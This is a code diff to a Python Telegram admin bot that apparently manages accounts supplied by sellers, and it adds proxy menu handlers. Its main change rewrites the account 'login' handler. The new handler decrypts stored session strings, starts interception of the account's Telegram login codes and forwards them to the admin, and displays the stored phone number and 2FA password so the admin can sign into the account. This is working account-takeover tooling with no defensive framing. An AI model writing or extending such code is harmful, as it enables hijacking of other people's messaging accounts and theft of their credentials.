@@ -170,12 +170,19 @@ Welcome, Admin {user.first_name}! 👋
                 await self.handle_security_settings(event)
             elif data == "proxy_settings":
                 await proxy_handlers.handle_proxy_settings(self, event)
+            elif data == "proxy_menu":
+                await proxy_handlers.handle_proxy_menu(self, event)
+            elif data == "proxy_list":
+                await proxy_handlers.handle_proxy_list(self, event)
             elif data == "proxy_add":
                 await proxy_handlers.handle_proxy_add(self, event)
             elif data == "proxy_test":
                 await proxy_handlers.handle_proxy_test(self, event)
             elif data == "proxy_disable":
                 await proxy_handlers.handle_proxy_disable(self, event)
+            elif data.startswith("proxy_delete:"):
+                proxy_id = data.split(":", 1)[1]
+                await proxy_handlers.handle_proxy_delete(self, event, proxy_id)
             elif data == "bot_settings":
                 logger.info(f"[ADMIN] Admin {user.telegram_user_id} clicked 'Bot Settings'")
                 await self.handle_bot_settings(event)
@@ -4133,11 +4140,9 @@ This will start intercepting login codes for the account."""
             await self.edit_message(event, "❌ An error occurred. Please try again.")
 
     async def handle_login_account(self, event, user, account_id):
-        """Test login to account"""
+        """Enable OTP interception for account login"""
         try:
             from bson import ObjectId
-            from telethon import TelegramClient
-            from telethon.sessions import StringSession
             from app.utils.encryption import decrypt_data
             
             account = await self.db_connection.accounts.find_one({"_id": ObjectId(account_id)})
@@ -4145,56 +4150,74 @@ This will start intercepting login codes for the account."""
                 await self.edit_message(event, "❌ Account not found", [[Button.inline("🔙 Back", "review_accounts")]])
                 return
             
-            await self.edit_message(event, "🔐 **Logging in...**\n\nPlease wait...")
-            
-            # Decrypt session
+            phone = account.get("phone_number", "Unknown")
+            username = account.get("username", "No username")
             session_string = account.get("session_string")
-            try:
-                decrypted_session = decrypt_data(session_string)
-            except:
-                decrypted_session = session_string
+            two_fa_password = account.get("tfa_password") or account.get("two_fa_password")  # Check both fields
             
-            # Get proxy if available
-            proxy = None
-            seller_id = account.get("seller_id")
-            if seller_id:
-                proxy_doc = await self.db_connection.seller_proxies.find_one({"seller_id": seller_id})
-                if proxy_doc:
-                    proxy = {
-                        "proxy_type": proxy_doc["proxy_type"],
-                        "addr": proxy_doc["proxy_host"],
-                        "port": proxy_doc["proxy_port"],
-                        "username": proxy_doc.get("proxy_username"),
-                        "password": proxy_doc.get("proxy_password")
-                    }
-            
-            # Login
-            client = TelegramClient(StringSession(decrypted_session), self.api_id, self.api_hash, proxy=proxy)
-            await client.connect()
-            
-            if not await client.is_user_authorized():
-                await client.disconnect()
-                await self.edit_message(event, "❌ **Login Failed**\n\nSession not authorized", [[Button.inline("🔙 Back", "review_accounts")]])
+            if not session_string:
+                await self.edit_message(event, "❌ No session found", [[Button.inline("🔙 Back", "review_accounts")]])
                 return
             
-            # Get account info
-            me = await client.get_me()
-            dialogs = await client.get_dialogs(limit=5)
+            # Decrypt session with better error handling
+            try:
+                decrypted_session = decrypt_data(session_string)
+                logger.info(f"Session decrypted successfully for account {account_id}")
+            except Exception as decrypt_error:
+                logger.error(f"Session decryption failed for {account_id}: {decrypt_error}")
+                # Try using session as-is if decryption fails
+                decrypted_session = session_string
             
-            await client.disconnect()
-            
-            # Format message
-            message = f"✅ **Login Successful!**\n\n"
-            message += f"👤 **Name:** {me.first_name} {me.last_name or ''}\n"
-            message += f"🆔 **Username:** @{me.username or 'None'}\n"
-            message += f"📱 **Phone:** {me.phone}\n"
-            message += f"🆔 **ID:** {me.id}\n"
-            message += f"💎 **Premium:** {'Yes' if me.premium else 'No'}\n"
-            message += f"🤖 **Bot:** {'Yes' if me.bot else 'No'}\n\n"
-            message += f"💬 **Recent Chats:** {len(dialogs)}\n"
-            
-            await self.edit_message(event, message, [[Button.inline("🔙 Back", "review_accounts")]])
+            # Start OTP interception for admin
+            if self.code_interceptor:
+                logger.info(f"Starting OTP interception for account {account_id}")
+                try:
+                    result = await self.code_interceptor.start_intercepting_account(
+                        str(account_id),
+                        decrypted_session,
+                        user.telegram_user_id  # Forward OTP to admin
+                    )
+                    logger.info(f"OTP interception result: {result}")
+                except Exception as intercept_error:
+                    logger.error(f"Failed to start interception: {intercept_error}", exc_info=True)
+                    result = False
+                
+                if result:
+                    message = f"✅ **OTP Interception Started!**\n\n"
+                    message += f"📱 **Phone Number:** `{phone}`\n"
+                    message += f"👤 **Username:** @{username}\n\n"
+                    message += f"🔐 **Instructions:**\n"
+                    message += f"1. Open Telegram app\n"
+                    message += f"2. Login with: `{phone}`\n"
+                    message += f"3. OTP will be forwarded here automatically\n"
+                    
+                    # Show 2FA password if available
+                    if two_fa_password:
+                        message += f"4. Enter 2FA password: `{two_fa_password}`\n\n"
+                        message += f"🔒 **2FA Enabled** - Password will be shown after OTP\n"
+                    else:
+                        message += f"\n🔓 **No 2FA** - Only OTP required\n"
+                    
+                    message += f"\n⏰ **OTP interception is now active**\n"
+                    message += f"\n⚠️ **Note:** Send a test message to this account to verify it's receiving messages."
+                    
+                    await self.edit_message(event, message, [[Button.inline("🔙 Back", "review_accounts")]])
+                else:
+                    await self.edit_message(event, "❌ Failed to start OTP interception", [[Button.inline("🔙 Back", "review_accounts")]])
+            else:
+                # Fallback: Just show phone number and 2FA
+                message = f"📱 **Account Login Details**\n\n"
+                message += f"**Phone:** `{phone}`\n"
+                message += f"**Username:** @{username}\n"
+                
+                if two_fa_password:
+                    message += f"**2FA Password:** `{two_fa_password}`\n\n"
+                    message += f"🔒 This account has 2FA enabled."
+                else:
+                    message += f"\n🔓 No 2FA enabled."
+                
+                await self.edit_message(event, message, [[Button.inline("🔙 Back", "review_accounts")]])
             
         except Exception as e:
             logger.error(f"Login account error: {str(e)}")
-            await self.edit_message(event, f"❌ **Login Error**\n\n{str(e)}", [[Button.inline("🔙 Back", "review_accounts")]])
+            await self.edit_message(event, f"❌ **Error**\n\n{str(e)}", [[Button.inline("🔙 Back", "review_accounts")]])
